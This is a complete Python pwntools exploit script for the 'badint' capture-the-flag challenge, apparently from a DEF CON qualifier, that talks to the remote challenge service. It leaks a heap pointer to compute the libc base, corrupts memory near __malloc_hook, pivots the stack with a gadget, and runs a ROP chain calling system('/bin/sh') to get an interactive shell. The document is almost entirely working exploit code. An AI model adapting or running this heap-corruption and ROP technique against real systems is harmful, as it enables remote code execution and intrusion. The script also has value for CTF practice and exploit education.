from pwn import *
from binascii import *

#s = process("./badint")
s = remote("badint_7312a689cf32f397727635e8be495322.quals.shallweplayaga.me",21813)

def pdu(seq, off, buf, lsf=False):
	s.recvuntil(":")
	s.sendline("%d" %seq)
	s.recvuntil(":")
	s.sendline("%d" %off)
	s.recvuntil(":")
	s.sendline(hexlify(buf))
	s.recvuntil(":")
	if lsf:
		s.sendline("Yes")
	else:
		s.sendline("No")

for i in xrange(1, 20):
	pdu(i, 0, ("%d" % (i%10))*8*i)

pdu(40, 8, "Q"*0xff,True)

s.recvuntil("]: ")
buf = s.recv(16)

ptr = int(buf,16)
print hex(ptr)

heap_ptr = u64(p64(ptr)[::-1])
print hex(heap_ptr)

libc = ELF("./libc.so")
#libc = ELF("./libc.so.6")
#libc.address = heap_ptr-libc.symbols["__malloc_hook"]-0x68  #-0x3c3b78
libc.address = heap_ptr-libc.symbols["__malloc_hook"]-0x78  #-0x3c3b78
print hex(libc.address)
victim = libc.symbols['__malloc_hook']-0x1b-8

print hex(victim)

#raw_input()
buf = p64(victim)
pdu(0,0x610,buf, True)

#bespoke = libc.address+0x4526a
#bespoke = libc.address+0x4652c

bespoke = u64("A"*8)

#32859 0x00000000000b3cb6 : leave ; add rsp, 0x28 ; pop rbx ; pop rbp ; pop r12 ; pop r13 ; pop r14 ;

bespoke = libc.address+0x00000000000b3cb6
#33728 0x0000000000042394 : leave ; add rsp, 0x20 ; pop rbx ; pop rbp ; pop r12 ; pop r13 ; pop r14 ;
#bespoke = libc.address+0x0000000000042394
print hex(bespoke)

buf = "B"*0x13
buf += p64(bespoke)
buf += "X"*8
buf += p64(0)
buf += "Z"*8*4
buf += p64(libc.symbols["__free_hook"]-0x10)
buf += "Q"*(0x60-len(buf))

raw_input()
pdu(41, 0, buf)


s.clean()
#pdu(42,0,"1")
s.sendline("42")
s.sendline("0")

def pack(a, addr):
	return(p64(addr+libc.address))

rop = ""

#rop += p64(libc.address+0x21102) #50585 0x0000000000021102 : pop rdi ; ret
rop += p64(libc.address+0x937)*30 #51520 0x0000000000000937 : ret
rop += p64(libc.address+0x22b1a) #49542 0x0000000000022b1a : pop rdi ; ret
rop += p64(libc.search("/bin/sh").next())
rop += p64(libc.symbols['system'])

buf = cyclic(64)+rop
s.sendline(buf)

s.interactive()
